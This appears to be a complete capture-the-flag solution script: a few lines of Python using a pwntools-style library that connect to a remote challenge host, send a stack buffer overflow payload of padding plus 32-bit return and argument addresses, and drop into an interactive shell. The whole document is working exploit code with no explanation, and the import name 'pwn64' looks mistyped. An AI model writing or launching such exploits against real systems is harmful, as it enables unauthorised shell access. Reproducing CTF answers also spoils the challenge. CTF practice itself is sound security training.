from pwn64 import *
sh=remote('pwn.challenge.ctf.show', 28178)
payload = b'a'*(0x12+4) + p32(0x80483A0) + p32(0) + p32(0x8048750)
sh.sendline(payload)
sh.interactive()